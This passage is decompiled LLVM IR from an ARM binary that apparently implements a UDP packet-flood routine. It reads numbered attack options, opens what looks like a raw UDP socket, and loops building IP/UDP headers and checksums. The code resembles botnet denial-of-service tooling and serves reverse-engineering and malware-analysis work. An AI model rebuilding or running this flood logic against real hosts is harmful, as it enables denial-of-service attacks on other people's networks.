  %v24_d124 = load i32, i32* @fp, align 4
  %v1_d128 = urem i32 %arg1, 256
  store i32 %v1_d128, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_d128, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_d140 = urem i32 %arg3, 256
  store i32 %v1_d140, i32* @r4, align 4
  %v2_d144 = call i32 @function_13a94(i32 %v1_d128, i32 4)
  %v0_d148 = load i32, i32* @r5, align 4
  store i32 %v0_d148, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d158 = load i32, i32* @r4, align 4
  store i32 %v0_d158, i32* %r0.global-to-local, align 4
  %v5_d15c = inttoptr i32 %v0_d148 to i32*
  %v6_d15c = call i32 @function_a4e8(i32 %v0_d158, i32* %v5_d15c, i32 2, i32 0)
  %v1_d168 = urem i32 %v6_d15c, 256
  store i32 %v1_d168, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d174 = load i32, i32* @r5, align 4
  store i32 %v0_d174, i32* %r1.global-to-local, align 4
  %v0_d178 = load i32, i32* @r4, align 4
  store i32 %v0_d178, i32* %r0.global-to-local, align 4
  %v5_d17c = trunc i32 %v6_d15c to i8
  %v6_d180 = inttoptr i32 %v0_d174 to i32*
  %v7_d180 = call i32 @function_a4e8(i32 %v0_d178, i32* %v6_d180, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_d184 = load i32, i32* @r5, align 4
  store i32 %v0_d184, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d180, i32* %fp.global-to-local, align 4
  %v0_d194 = load i32, i32* @r4, align 4
  store i32 %v0_d194, i32* %r0.global-to-local, align 4
  %v4_d198 = inttoptr i32 %v0_d184 to i32*
  %v5_d198 = call i32 @function_a4e8(i32 %v0_d194, i32* %v4_d198, i32 4, i32 64)
  %v1_d1a0 = urem i32 %v5_d198, 256
  store i32 %v1_d1a0, i32* %ip.global-to-local, align 4
  %v0_d1a4 = load i32, i32* @r5, align 4
  store i32 %v0_d1a4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d1b0 = load i32, i32* @r4, align 4
  store i32 %v0_d1b0, i32* %r0.global-to-local, align 4
  %v5_d1b4 = trunc i32 %v5_d198 to i8
  %v6_d1b8 = inttoptr i32 %v0_d1a4 to i32*
  %v7_d1b8 = call i32 @function_a4e8(i32 %v0_d1b0, i32* %v6_d1b8, i32 5, i32 0)
  %v1_d1c4 = urem i32 %v7_d1b8, 256
  store i32 %v1_d1c4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d1d0 = load i32, i32* @r5, align 4
  store i32 %v0_d1d0, i32* %r1.global-to-local, align 4
  %v0_d1d4 = load i32, i32* @r4, align 4
  store i32 %v0_d1d4, i32* %r0.global-to-local, align 4
  %v5_d1dc = inttoptr i32 %v0_d1d0 to i32*
  %v6_d1dc = call i32 @function_a4e8(i32 %v0_d1d4, i32* %v5_d1dc, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_d1e4 = load i32, i32* @r5, align 4
  store i32 %v0_d1e4, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_d1dc, i32* @r7, align 4
  %v0_d1f4 = load i32, i32* @r4, align 4
  store i32 %v0_d1f4, i32* %r0.global-to-local, align 4
  %v4_d1f8 = inttoptr i32 %v0_d1e4 to i32*
  %v5_d1f8 = call i32 @function_a4e8(i32 %v0_d1f4, i32* %v4_d1f8, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_d1fc = load i32, i32* @r5, align 4
  store i32 %v0_d1fc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_d1f8, i32* %sb.global-to-local, align 4
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* %r0.global-to-local, align 4
  %v4_d210 = inttoptr i32 %v0_d1fc to i32*
  %v5_d210 = call i32 @function_a4e8(i32 %v0_d20c, i32* %v4_d210, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d21c = load i32, i32* @r5, align 4
  store i32 %v0_d21c, i32* %r1.global-to-local, align 4
  store i32 %v5_d210, i32* @r6, align 4
  %v0_d224 = load i32, i32* @r4, align 4
  store i32 %v0_d224, i32* %r0.global-to-local, align 4
  %v4_d228 = inttoptr i32 %v0_d21c to i32*
  %v5_d228 = call i32 @function_a4e8(i32 %v0_d224, i32* %v4_d228, i32 1, i32 1)
  %v2_d234 = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_d234, i32* %r3.global-to-local, align 4
  %v1_d238 = urem i32 %v5_d228, 256
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  %v0_d23c = load i32, i32* @r5, align 4
  store i32 %v0_d23c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_d244 = load i32, i32* @r4, align 4
  store i32 %v0_d244, i32* %r0.global-to-local, align 4
  %v5_d24c = inttoptr i32 %v0_d23c to i32*
  %v6_d24c = call i32 @function_a4e8(i32 %v0_d244, i32* %v5_d24c, i32 25, i32 %v2_d234)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d260 = call i32 @function_13790(i32 2, i32 3, i32 17)
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v7_d264 = icmp eq i32 %v3_d260, -1
  store i1 %v7_d264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d264, label %dec_label_pc_d68c, label %dec_label_pc_d270

dec_label_pc_d270:                                ; preds = %dec_label_pc_d124
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d278 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d278, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d28c = call i32 @function_13760(i32 %v3_d260, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_d28c, i32* %r0.global-to-local, align 4
  %v7_d290 = icmp eq i32 %v6_d28c, -1
  store i1 %v7_d290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d290, label %dec_label_pc_d684, label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d270
  %v0_d298 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_d2a4 = urem i32 %v0_d298, 65536
  store i32 %v3_d2a4, i32* %r2.global-to-local, align 4
  %v3_d2a8 = icmp ugt i32 %v3_d2a4, 1459
  %v9_d2a8 = icmp eq i32 %v3_d2a4, 1460
  store i1 %v9_d2a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d2a8, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_d298
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_d298, %bb
  %v0_d2b0 = phi i32 [ %v3_d2a4, %dec_label_pc_d298 ], [ 1460, %bb ]
  %v0_d2b4 = load i32, i32* %fp.global-to-local, align 4
  %v3_d2b4 = mul i32 %v0_d2b4, 65536
  store i32 %v3_d2b4, i32* %r0.global-to-local, align 4
  %v3_d2b8 = urem i32 %v0_d2b4, 65536
  store i32 %v3_d2b8, i32* %r2.global-to-local, align 4
  %v0_d2bc = load i32, i32* @sl, align 4
  %v2_d2bc = icmp eq i32 %v0_d2bc, 0
  store i1 %v2_d2bc, i1* %cpsr_z.global-to-local, align 1
  %v0_d2c0 = load i32, i32* %sb.global-to-local, align 4
  %v0_d2c4 = load i32, i32* @r7, align 4
  %tmp72 = icmp slt i32 %v0_d2bc, 1
  br i1 %tmp72, label %bb73, label %bb74

bb73:                                             ; preds = %bb71
  store i32 %v0_d2b0, i32* %r2.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %bb71, %bb73
  %v5_d2ec = phi i32 [ %v3_d2b8, %bb71 ], [ %v0_d2b0, %bb73 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2d4 = urem i32 %v0_d2c4, 65536
  store i32 %v3_d2d4, i32* %r3.global-to-local, align 4
  %v3_d2d8 = urem i32 %v0_d2c0, 65536
  store i32 %v3_d2d8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp72, label %.thread, label %dec_label_pc_d2f4

.thread:                                          ; preds = %bb74
  %v6_d2e8 = add nsw i32 %v5_d2ec, 28
  store i32 %v6_d2e8, i32* @fp, align 4
  %v6_d2ec = add nsw i32 %v5_d2ec, 8
  store i32 %v6_d2ec, i32* @sb, align 4
  br label %dec_label_pc_d468

dec_label_pc_d2f4:                                ; preds = %bb74
  %v1_d2f8 = add nuw nsw i32 %v0_d2b0, 28
  store i32 %v1_d2f8, i32* @fp, align 4
  %tmp75 = mul nuw nsw i32 %v1_d2f8, 256
  %v1_d304 = and i32 %tmp75, 65280
  %tmp76 = udiv i32 %v0_d2b4, 256
  %v3_d308 = urem i32 %tmp76, 256
  %v2_d31c = icmp eq i32 %v1_d1c4, 0
  store i1 %v2_d31c, i1* %cpsr_z.global-to-local, align 1
  %v1_d320 = urem i32 %v0_d2b4, 256
  %v1_d328 = add nuw nsw i32 %v0_d2b0, 8
  store i32 %v1_d328, i32* @sb, align 4
  %v1_d330 = urem i32 %v0_d2c4, 256
  %v1_d334 = urem i32 %v0_d2c0, 256
  store i32 %v1_d334, i32* %ip.global-to-local, align 4
  store i32 %v1_d304, i32* %r3.global-to-local, align 4
  %tmp77 = mul nuw nsw i32 %v1_d328, 256
  %v4_d340 = mul nuw nsw i32 %v1_d320, 256
  %v5_d340 = or i32 %v4_d340, %v3_d308
  store i32 %v5_d340, i32* %r0.global-to-local, align 4
  %v3_d344 = mul nuw nsw i32 %v1_d330, 256
  store i32 %v3_d344, i32* %r2.global-to-local, align 4
  %tmp78 = udiv i32 %v0_d2c0, 256
  %v3_d348 = urem i32 %tmp78, 256
  %v1_d34c = and i32 %tmp77, 65280
  store i32 %v1_d34c, i32* %r1.global-to-local, align 4
  %tmp79 = udiv i32 %v1_d2f8, 256
  %v4_d350 = urem i32 %tmp79, 256
  %v5_d350 = or i32 %v4_d350, %v1_d304
  store i32 %v5_d350, i32* @lr, align 4
  %tmp80 = udiv i32 %v0_d2c4, 256
  %v4_d354 = urem i32 %tmp80, 256
  %v5_d354 = or i32 %v4_d354, %v3_d344
  store i32 %v5_d354, i32* @r4, align 4
  %v5_d358 = trunc i32 %tmp79 to i8
  %v5_d35c = trunc i32 %tmp76 to i8
  %v4_d360 = mul nuw nsw i32 %v1_d334, 256
  %v5_d360 = or i32 %v4_d360, %v3_d348
  store i32 %v5_d360, i32* @r5, align 4
  %tmp81 = udiv i32 %v1_d328, 256
  %v4_d364 = urem i32 %tmp81, 256
  %v5_d364 = or i32 %v4_d364, %v1_d34c
  store i32 %v5_d364, i32* @r7, align 4
  br i1 %v2_d31c, label %dec_label_pc_d36c, label %dec_label_pc_d694

dec_label_pc_d36c:                                ; preds = %dec_label_pc_d2f4
  %v3_d36c36 = udiv i32 %v1_d304, 256
  store i32 %v3_d36c36, i32* %ip.global-to-local, align 4
  store i32 %v1_d320, i32* %r0.global-to-local, align 4
  store i32 %v1_d330, i32* %r1.global-to-local, align 4
  store i32 %v1_d334, i32* %r2.global-to-local, align 4
  %v3_d37c37 = udiv i32 %v1_d34c, 256
  store i32 %v3_d37c37, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v4_d3e0 = sext i8 %v5_d17c to i32
  %v4_d420 = sext i8 %v5_d35c to i32
  %sext15 = mul i32 %v0_d2b4, 16777216
  %v4_d424 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v0_d2c4, 16777216
  %v4_d43c = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_d328, 16777216
  %v4_d440 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_d2c0, 16777216
  %v4_d444 = sdiv i32 %sext18, 16777216
  %v1_d42c = trunc i32 %v1_d2f8 to i8
  %v1_d44c = trunc i32 %v4_d440 to i8
  br label %dec_label_pc_d398

dec_label_pc_d398:                                ; preds = %dec_label_pc_d398, %dec_label_pc_d36c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d3a4 = call i32 @function_13a94(i32 1510, i32 1)
  store i32 %v2_d3a4, i32* %r0.global-to-local, align 4
  store i32 %v2_d144, i32* %ip.global-to-local, align 4
  %v3_d3ac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d3ac, i32* %r2.global-to-local, align 4
  %v2_d3b0 = load i32, i32* @r6, align 4
  %v5_d3b0 = mul i32 %v2_d3b0, 4
  %v6_d3b0 = add i32 %v5_d3b0, %v2_d144
  %v7_d3b0 = inttoptr i32 %v6_d3b0 to i32*
  store i32 %v2_d3a4, i32* %v7_d3b0, align 4
  %v0_d3b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_d3b4 = load i32, i32* %r2.global-to-local, align 4
  %v4_d3b4 = mul i32 %v1_d3b4, 4
  %v5_d3b4 = add i32 %v4_d3b4, %v0_d3b4
  %v6_d3b4 = inttoptr i32 %v5_d3b4 to i32*
  %v7_d3b4 = load i32, i32* %v6_d3b4, align 4
  store i32 %v7_d3b4, i32* %r1.global-to-local, align 4
  %v1_d3b8 = inttoptr i32 %v7_d3b4 to i8*
  %v2_d3b8 = load i8, i8* %v1_d3b8, align 1
  %tmp = urem i8 %v2_d3b8, 16
  %v1_d3bc = zext i8 %tmp to i32
  %v1_d3c0 = or i32 %v1_d3bc, 64
  store i32 %v1_d3c0, i32* %r3.global-to-local, align 4
  %v1_d3c4 = trunc i32 %v1_d3c0 to i8
  store i8 %v1_d3c4, i8* %v1_d3b8, align 1
  %v0_d3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d3c8 = inttoptr i32 %v0_d3c8 to i8*
  %v2_d3c8 = load i8, i8* %v1_d3c8, align 1
  %v3_d3c8 = zext i8 %v2_d3c8 to i32
  %v1_d3cc = and i32 %v3_d3c8, 240
  %v1_d3d0 = or i32 %v1_d3cc, 5
  store i32 %v1_d3d0, i32* %r2.global-to-local, align 4
  %v3_d3d8 = add i32 %v0_d3c8, 9
  %v4_d3d8 = inttoptr i32 %v3_d3d8 to i8*
  store i8 17, i8* %v4_d3d8, align 1
  %v0_d3dc = load i32, i32* %r2.global-to-local, align 4
  %v1_d3dc = trunc i32 %v0_d3dc to i8
  %v2_d3dc = load i32, i32* %r1.global-to-local, align 4
  %v3_d3dc = inttoptr i32 %v2_d3dc to i8*
  store i8 %v1_d3dc, i8* %v3_d3dc, align 1
  store i32 %v4_d3e0, i32* %r0.global-to-local, align 4
  %v2_d3e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_d3e4 = add i32 %v2_d3e4, 1
  %v4_d3e4 = inttoptr i32 %v3_d3e4 to i8*
  store i8 %v5_d17c, i8* %v4_d3e4, align 1
  %v2_d3ec = load i32, i32* %r1.global-to-local, align 4
  %v3_d3ec = add i32 %v2_d3ec, 8
  %v4_d3ec = inttoptr i32 %v3_d3ec to i8*
  store i8 %v5_d1b4, i8* %v4_d3ec, align 1
  %v3_d3f0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d3f0, i32* %r2.global-to-local, align 4
  store i32 %v6_d24c, i32* %ip.global-to-local, align 4
  %v3_d3f8 = mul i32 %v3_d3f0, 32
  store i32 %v3_d3f8, i32* %r3.global-to-local, align 4
  %v1_d3fc = load i32, i32* %r1.global-to-local, align 4
  %v2_d3fc = add i32 %v1_d3fc, 12
  %v3_d3fc = inttoptr i32 %v2_d3fc to i32*
  store i32 %v6_d24c, i32* %v3_d3fc, align 4
  %v0_d400 = load i32, i32* %r3.global-to-local, align 4
  %v1_d400 = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_d400, -8
  %v5_d400 = add i32 %v0_d400, %tmp83
  %v1_d404 = load i32, i32* @r8, align 4
  %v2_d404 = add i32 %v5_d400, %v1_d404
  store i32 %v2_d404, i32* %r3.global-to-local, align 4
  %v1_d408 = add i32 %v2_d404, 16
  %v2_d408 = inttoptr i32 %v1_d408 to i32*
  %v3_d408 = load i32, i32* %v2_d408, align 4
  %v1_d40c = load i32, i32* %r1.global-to-local, align 4
  %v2_d40c = add i32 %v1_d40c, 16
  %v3_d40c = inttoptr i32 %v2_d40c to i32*
  store i32 %v3_d408, i32* %v3_d40c, align 4
  %v0_d414 = load i32, i32* %r2.global-to-local, align 4
  %v1_d414 = add i32 %v0_d414, 1
  store i32 %v1_d414, i32* @r6, align 4
  %v2_d418 = load i32, i32* %r1.global-to-local, align 4
  %v3_d418 = add i32 %v2_d418, 2
  %v4_d418 = inttoptr i32 %v3_d418 to i8*
  store i8 %v5_d358, i8* %v4_d418, align 1
  store i32 %v4_d420, i32* %ip.global-to-local, align 4
  store i32 %v4_d424, i32* %r0.global-to-local, align 4
  %v0_d428 = load i32, i32* %r1.global-to-local, align 4
  %v1_d428 = add i32 %v0_d428, 20
  store i32 %v1_d428, i32* %r3.global-to-local, align 4
  %v3_d42c = add i32 %v0_d428, 3
  %v4_d42c = inttoptr i32 %v3_d42c to i8*
  store i8 %v1_d42c, i8* %v4_d42c, align 1
  %v0_d430 = load i32, i32* %ip.global-to-local, align 4
  %v1_d430 = trunc i32 %v0_d430 to i8
  %v2_d430 = load i32, i32* %r1.global-to-local, align 4
  %v3_d430 = add i32 %v2_d430, 4
  %v4_d430 = inttoptr i32 %v3_d430 to i8*
  store i8 %v1_d430, i8* %v4_d430, align 1
  %v0_d434 = load i32, i32* %r0.global-to-local, align 4
  %v1_d434 = trunc i32 %v0_d434 to i8
  %v2_d434 = load i32, i32* %r1.global-to-local, align 4
  %v3_d434 = add i32 %v2_d434, 5
  %v4_d434 = inttoptr i32 %v3_d434 to i8*
  store i8 %v1_d434, i8* %v4_d434, align 1
  %v0_d438 = load i32, i32* @r4, align 4
  %v1_d438 = trunc i32 %v0_d438 to i8
  %v2_d438 = load i32, i32* %r1.global-to-local, align 4
  %v3_d438 = add i32 %v2_d438, 20
  %v4_d438 = inttoptr i32 %v3_d438 to i8*
  store i8 %v1_d438, i8* %v4_d438, align 1
  store i32 %v4_d43c, i32* %r2.global-to-local, align 4
  store i32 %v4_d440, i32* %r1.global-to-local, align 4
  store i32 %v4_d444, i32* %ip.global-to-local, align 4
  %v0_d448 = load i32, i32* @r6, align 4
  %v1_d448 = load i32, i32* @sl, align 4
  %v9_d448 = icmp eq i32 %v0_d448, %v1_d448
  store i1 %v9_d448, i1* %cpsr_z.global-to-local, align 1
  %v2_d44c = load i32, i32* %r3.global-to-local, align 4
  %v3_d44c = add i32 %v2_d44c, 5
  %v4_d44c = inttoptr i32 %v3_d44c to i8*
  store i8 %v1_d44c, i8* %v4_d44c, align 1
  %v0_d450 = load i32, i32* %r2.global-to-local, align 4
  %v1_d450 = trunc i32 %v0_d450 to i8
  %v2_d450 = load i32, i32* %r3.global-to-local, align 4
  %v3_d450 = add i32 %v2_d450, 1
  %v4_d450 = inttoptr i32 %v3_d450 to i8*
  store i8 %v1_d450, i8* %v4_d450, align 1
  %v0_d454 = load i32, i32* @r5, align 4
  %v1_d454 = trunc i32 %v0_d454 to i8
  %v2_d454 = load i32, i32* %r3.global-to-local, align 4
  %v3_d454 = add i32 %v2_d454, 2
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v1_d454, i8* %v4_d454, align 1
  %v0_d458 = load i32, i32* %ip.global-to-local, align 4
  %v1_d458 = trunc i32 %v0_d458 to i8
  %v2_d458 = load i32, i32* %r3.global-to-local, align 4
  %v3_d458 = add i32 %v2_d458, 3
  %v4_d458 = inttoptr i32 %v3_d458 to i8*
  store i8 %v1_d458, i8* %v4_d458, align 1
  %v0_d45c = load i32, i32* @r7, align 4
  %v1_d45c = trunc i32 %v0_d45c to i8
  %v2_d45c = load i32, i32* %r3.global-to-local, align 4
  %v3_d45c = add i32 %v2_d45c, 4
  %v4_d45c = inttoptr i32 %v3_d45c to i8*
  store i8 %v1_d45c, i8* %v4_d45c, align 1
  %v0_d460 = load i32, i32* @r6, align 4
  store i32 %v0_d460, i32* %stack_var_-40, align 4
  %v5_d464 = icmp slt i32 %v0_d448, %v1_d448
  br i1 %v5_d464, label %dec_label_pc_d398, label %dec_label_pc_d468

dec_label_pc_d468:                                ; preds = %dec_label_pc_d6c8, %dec_label_pc_d398, %.thread
  %v0_d468 = load i32, i32* @sl, align 4
  %v2_d468 = icmp eq i32 %v0_d468, 0
  store i1 %v2_d468, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_d614 = icmp eq i32 %v3_d2b8, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  %v2_d4e0 = icmp eq i32 %v1_d238, 0
  %v2_d4a8 = icmp eq i32 %v6_d24c, -1
  %v7_d4a8 = icmp eq i32 %v6_d24c, -1
  br label %dec_label_pc_d470.outer

dec_label_pc_d470.outer:                          ; preds = %dec_label_pc_d590, %dec_label_pc_d468
  %v1_d470.ph.in = phi i32 [ %v1_d584, %dec_label_pc_d590 ], [ %v0_d468, %dec_label_pc_d468 ]
  %v0_d470.ph = phi i1 [ %v2_d590, %dec_label_pc_d590 ], [ %v2_d468, %dec_label_pc_d468 ]
  %v1_d470.ph = icmp slt i32 %v1_d470.ph.in, 0
  %v4_d470 = or i1 %v1_d470.ph, %v0_d470.ph
  br label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d470.outer, %dec_label_pc_d470
  br i1 %v4_d470, label %dec_label_pc_d470, label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d470
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d4e8, %dec_label_pc_d474
  %v1_d494 = phi i32 [ %v1_d580, %dec_label_pc_d4e8 ], [ 0, %dec_label_pc_d474 ]
  %v5_d484 = mul i32 %v1_d494, 24
  %v1_d488 = load i32, i32* @r8, align 4
  %v2_d488 = add i32 %v1_d488, %v5_d484
  store i32 %v2_d488, i32* %r3.global-to-local, align 4
  store i32 %v2_d144, i32* %ip.global-to-local, align 4
  %v1_d490 = add i32 %v2_d488, 20
  %v2_d490 = inttoptr i32 %v1_d490 to i8*
  %v3_d490 = load i8, i8* %v2_d490, align 1
  %v4_d490 = zext i8 %v3_d490 to i32
  store i32 %v4_d490, i32* %r2.global-to-local, align 4
  %v4_d494 = mul i32 %v1_d494, 4
  %v5_d494 = add i32 %v4_d494, %v2_d144
  %v6_d494 = inttoptr i32 %v5_d494 to i32*
  %v7_d494 = load i32, i32* %v6_d494, align 4
  store i32 %v7_d494, i32* @r5, align 4
  %v7_d498 = icmp eq i8 %v3_d490, 31
  store i1 %v7_d498, i1* %cpsr_z.global-to-local, align 1
  %v1_d49c = add i32 %v7_d494, 20
  store i32 %v1_d49c, i32* @r6, align 4
  %tmp84 = icmp ult i8 %v3_d490, 32
  br i1 %tmp84, label %dec_label_pc_d59c, label %dec_label_pc_d4a4

dec_label_pc_d4a4:                                ; preds = %dec_label_pc_d480
  store i32 %v6_d24c, i32* %r0.global-to-local, align 4
  store i1 %v7_d4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d4a8, label %dec_label_pc_d604, label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d59c, %dec_label_pc_d4a4
  store i32 %v3_d2b8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_d614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d614, label %dec_label_pc_d620, label %dec_label_pc_d4c4

dec_label_pc_d4c4:                                ; preds = %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge, %dec_label_pc_d4b0
  %v1_d4c8 = phi i32 [ %v1_d4c8.pre, %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), %dec_label_pc_d4b0 ]
  store i32 %v3_d2d4, i32* %r2.global-to-local, align 4
  %v9_d4c8 = icmp eq i32 %v3_d2d4, %v1_d4c8
  store i1 %v9_d4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4c8, label %dec_label_pc_d63c, label %dec_label_pc_d4d0

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge, %dec_label_pc_d4c4
  %v1_d4d4 = phi i32 [ %v1_d4d4.pre, %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge ], [ %v1_d4c8, %dec_label_pc_d4c4 ]
  store i32 %v3_d2d8, i32* %r3.global-to-local, align 4
  %v9_d4d4 = icmp eq i32 %v3_d2d8, %v1_d4d4
  store i1 %v9_d4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4d4, label %dec_label_pc_d658, label %dec_label_pc_d4dc

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d63c, %dec_label_pc_d4d0
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  store i1 %v2_d4e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d4e0, label %dec_label_pc_d4e8, label %dec_label_pc_d674

dec_label_pc_d4e8:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d658, %dec_label_pc_d674
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d4ec = load i32, i32* @r7, align 4
  %v1_d4ec = trunc i32 %v0_d4ec to i8
  %v2_d4ec = load i32, i32* @r5, align 4
  %v3_d4ec = add i32 %v2_d4ec, 10
  %v4_d4ec = inttoptr i32 %v3_d4ec to i8*
  store i8 %v1_d4ec, i8* %v4_d4ec, align 1
  %v0_d4f0 = load i32, i32* @r7, align 4
  %v1_d4f0 = trunc i32 %v0_d4f0 to i8
  %v2_d4f0 = load i32, i32* @r5, align 4
  %v3_d4f0 = add i32 %v2_d4f0, 11
  %v4_d4f0 = inttoptr i32 %v3_d4f0 to i8*
  store i8 %v1_d4f0, i8* %v4_d4f0, align 1
  %v0_d4f4 = load i32, i32* @r5, align 4
  store i32 %v0_d4f4, i32* @r0, align 4
  %v2_d4f8 = call i32 @function_e424(i32 %v0_d4f4, i32 20)
  %v3_d4f8 = trunc i32 %v2_d4f8 to i8
  store i32 %v2_d4f8, i32* %r0.global-to-local, align 4
  %v4_d4fc = sdiv i32 %v2_d4f8, 256
  store i32 %v4_d4fc, i32* %r3.global-to-local, align 4
  %v1_d500 = trunc i32 %v4_d4fc to i8
  %v2_d500 = load i32, i32* @r5, align 4
  %v3_d500 = add i32 %v2_d500, 11
  %v4_d500 = inttoptr i32 %v3_d500 to i8*
  store i8 %v1_d500, i8* %v4_d500, align 1
  %v3_d504 = load i32, i32* @r5, align 4
  %v4_d504 = add i32 %v3_d504, 10
  %v5_d504 = inttoptr i32 %v4_d504 to i8*
  store i8 %v3_d4f8, i8* %v5_d504, align 1
  %v0_d508 = load i32, i32* @r7, align 4
  %v1_d508 = trunc i32 %v0_d508 to i8
  %v2_d508 = load i32, i32* @r6, align 4
  %v3_d508 = add i32 %v2_d508, 6
  %v4_d508 = inttoptr i32 %v3_d508 to i8*
  store i8 %v1_d508, i8* %v4_d508, align 1
  %v0_d50c = load i32, i32* @r7, align 4
  %v1_d50c = trunc i32 %v0_d50c to i8
  %v2_d50c = load i32, i32* @r6, align 4
  %v3_d50c = add i32 %v2_d50c, 7
  %v4_d50c = inttoptr i32 %v3_d50c to i8*
  store i8 %v1_d50c, i8* %v4_d50c, align 1
  %v0_d510 = load i32, i32* @r5, align 4
  %v1_d510 = add i32 %v0_d510, 24
  %v2_d510 = inttoptr i32 %v1_d510 to i8*
  %v3_d510 = load i8, i8* %v2_d510, align 1
  %v4_d510 = zext i8 %v3_d510 to i32
  store i32 %v4_d510, i32* %r3.global-to-local, align 4
  %v1_d514 = add i32 %v0_d510, 25
  %v2_d514 = inttoptr i32 %v1_d514 to i8*
  %v3_d514 = load i8, i8* %v2_d514, align 1
  %v4_d514 = zext i8 %v3_d514 to i32
  %v0_d518 = load i32, i32* @r6, align 4
  store i32 %v0_d518, i32* @r1, align 4
  %v4_d51c = mul nuw nsw i32 %v4_d514, 256
  %v5_d51c = or i32 %v4_d51c, %v4_d510
  store i32 %v5_d51c, i32* %r2.global-to-local, align 4
  store i32 %v0_d510, i32* %r0.global-to-local, align 4
  %v0_d524 = load i32, i32* @sb, align 4
